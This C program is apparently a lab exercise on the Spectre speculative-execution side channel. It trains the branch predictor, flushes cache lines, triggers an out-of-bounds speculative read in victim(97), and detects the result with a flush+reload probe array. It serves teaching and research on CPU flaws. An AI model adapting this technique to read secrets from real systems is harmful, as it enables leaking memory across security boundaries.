#include <emmintrin.h>
#include <x86intrin.h>
#include <stdint.h>
#include <stdio.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

int size = 10;
uint8_t array[256 * 4096];
uint8_t temp = 0;

#include "flush-reload.h"

void victim(size_t x) {
	if (x < size) {
		temp = array[x * 4096 + DELTA];
	}
}

int main() {
	int i;
	// FLUSH the probing array
	flushSideChannel();
	// Train the CPU to take the true branch inside victim()
	for (i = 0; i < 10; i++) {
		victim(i);
	}
	// Exploit the out-of-order execution
	_mm_clflush(&size);
	for (i = 0; i < 256; i++) {
		_mm_clflush(&array[i * 4096 + DELTA]);
	}
	victim(97);
	// RELOAD the probing array
	reloadSideChannel();

	return (0);
}
